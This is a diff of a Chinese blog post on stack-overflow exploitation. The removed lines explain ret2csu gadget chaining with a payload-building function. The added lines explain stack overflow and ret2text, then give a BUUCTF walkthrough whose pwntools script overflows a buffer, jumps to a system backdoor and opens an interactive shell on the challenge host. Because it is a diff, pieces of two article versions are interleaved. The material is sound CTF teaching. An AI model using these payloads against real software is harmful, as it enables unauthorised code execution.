+<h2 id="三、栈溢出的原理"><a href="#三、栈溢出的原理" class="headerlink" title="三、栈溢出的原理"></a>三、栈溢出的原理</h2><blockquote>
+<p>栈溢出指的是：程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数,因而导致与其相邻的栈中的变量的值被改变。</p>
+<p>栈溢出漏洞轻则可以使程序崩溃,重则可以使攻击者控制程序执行流程。</p>
+</blockquote>
+<p>发生栈溢出的基本前提：</p>
 <ul>
-<li>从 0x00000000004007B6 一直到结尾，存在有6个pop指令，我们可以利用栈溢出，然后构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。（控制这些寄存器的值的作用就是通过结合前一个函数，然后将这些寄存器的数据赋给rdx、rsi、rdi寄存器，这样就可以构造gadget，实现函数跳转了）</li>
-<li>接着确定ret的返回地址，返回到 loc_4007B6 函数中，传递构造好的寄存器的数据，从 0x00000000004007A0 到 0x00000000004007A9，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，那么r12 为存储我们想要调用的函数的地址。</li>
-<li>从 0x00000000004007AD 到 0x00000000004006B4，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li>
-<li>然后再往下执行程序，为了堆栈平衡。就是说,当ret_addr执行完之后,按照流程它会继续往下执行loc_400646函数,如果它执行的话，他就会再次 pop寄存器，更换我们已经布置好的内容。所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充），这里的大小位0x38。此时程序有到达了ret返回函数的地址处了，然后再在最后ret时改写为main函数的地址。这样就可以既可以获取write函数的地址，而且其本身又可以重新执行main函数</li>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
 </ul>
-<p>流程图：</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126172951142.png" alt="image-20211126172951142"></p>
-<p>函数构造：</p>
-<pre><code class="python">offset = 
-csu_start_addr = 
-csu_end_addr
-def rcsu(rbx, rbp, r12, r13 , r14 , r15, ret_addr):
-    pyaload = offset * &#39;a&#39;
-    payload += p64(csu_start_addr)
-    payload += &quot;ret_addr&quot;	# 程序在调用函数时都会先构造pop一个预留一个返回地址，方便调用函数后回去，由于这里该函数得到最后存在ret指令所以不需要提前填可随意填充
-    payload += p64(0x0)     # rbx = 0x0
-    payload += p64(0x1)     # rbp = 0x1 
-    payload += p64(r12)     # r12 = call_addr
-    payload += p64(r13)     # r13 = rdx call_addr函数的第三个参数
-    payload += p64(r14)     # r14 = rsi call_addr函数的第二个参数
-    payload += p64(r15)     # r15 = edi call_addr函数的第一个参数
-    payload += p64(csu_end_addr)# 这里一般为这个函数的前一个函数地址，因为需要将pop的内容传递到rdx、rsi、edi寄存器当中
-    payload += &#39;A&#39; * 56 	# 这里需要注意：如果程序需要多次调用这段可以再次使用，而不是填充为垃圾数据
-    payload += p64(ret_addr)
-    r.sendline(payload)
+<h2 id="四、ret2txt的原理"><a href="#四、ret2txt的原理" class="headerlink" title="四、ret2txt的原理"></a>四、ret2txt的原理</h2><p>​		ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h2 id="五、实例解析"><a href="#五、实例解析" class="headerlink" title="五、实例解析"></a>五、实例解析</h2><p>以BUUCFT上面的</p>
+<h3 id="1-程序分析"><a href="#1-程序分析" class="headerlink" title="1. 程序分析"></a>1. 程序分析</h3><p>**<font color=red >64位程序，只开启了NX保护</font>**。打开IDA，查看一下源程序<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/20210314151057224.png" alt="在这里插入图片描述"></p>
+<h3 id="2-代码分析"><a href="#2-代码分析" class="headerlink" title="2. 代码分析"></a>2. 代码分析</h3><p>就一个write函数和rea函数。可以发现read函数（这里buf只有0x80字节，而read需要从buf中读取0x200个字节），存在溢出条件。然后找是否存在后门函数<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-164243388817221.png" alt="在这里插入图片描述"><br>找到了system，是简单的栈溢出，找到偏移量为0x80+8，然后覆盖返回地址就可以了</p>
+<h3 id="3-exp脚本"><a href="#3-exp脚本" class="headerlink" title="3. exp脚本"></a>3. exp脚本</h3><pre><code># coding: utf-8
+from pwn import *
+
+r = remote(&#39;node3.buuoj.cn&#39;,26896)
+
+offset = 0x80 + 8
+payload = offset*&#39;a&#39; + p64(0x400596)
+
+r.sendline(payload)
+r.interactive()
 </code></pre>
-<ul>
-<li>这样构造的好处：比如说你可以通过call指令泄露某个函数的地址，然而却不改变程序的流程，让它重新执行程序，就是说可以重复多次利用溢出漏洞，而且相比之下存在更多的gadget可以利用。</li>
-<li>利用：利用的方式有很多，通常都是用来泄露函数的地址（绕过pie的保护、泄露libc的基地址）</li>
-</ul>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
